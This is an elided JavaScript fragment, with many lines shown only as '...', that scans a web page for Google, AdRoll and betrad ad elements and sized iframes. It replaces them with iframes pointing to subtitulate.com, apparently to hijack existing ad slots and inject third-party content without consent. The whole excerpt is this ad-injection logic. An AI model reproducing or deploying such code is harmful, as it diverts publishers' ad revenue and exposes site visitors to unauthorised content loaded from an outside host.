        ...
        for (var i = 0; i < xys.length; i++) {
            ...
            while (ifr.tagName.toLowerCase() != 'html') {
                ...
                if(ifr.tagName.toLowerCase() == 'body'){
                    ...
                    if(tam(w+'x'+h,true)){
                     			ifr.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://subtitulate.com/cc.html?28=' + w + '&22=' + h + '"></iframe>'; 
 			                    }else{ 
                        if(tam(w+'x'+h,false)){
            ...
            try {
                if(xsy[x].alt == 'Anuncios Google' || xsy[x].src.indexOf('http://a.adroll.com/') !== -1 || xsy[x].src.indexOf('//c.betrad.com/') !== -1){
                    ...
                    while (ifra.tagName.toLowerCase() != 'html') {
                        if(ifra.tagName.toLowerCase() == 'body'){
                            ...
                            if(tam(wa+'x'+ha,true) && xsy[x].src.indexOf('http://a.adroll.com/') === -1 && xsy[x].src.indexOf('//c.betrad.com/') === -1){
                              				ifra.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+wa+'" height="'+ha+'" src="http://subtitulate.com/cc.html?28=' + wa + '&22=' + ha + '"></iframe>';
                    ...
                    if(d || e || f || j){
                        ...
                        if(tam(sz,true)) {
                                                    fra[x].src = 'http://subtitulate.com/cc.html?28=' + fra[x].offsetWidth + '&22=' + fra[x].offsetHeight;
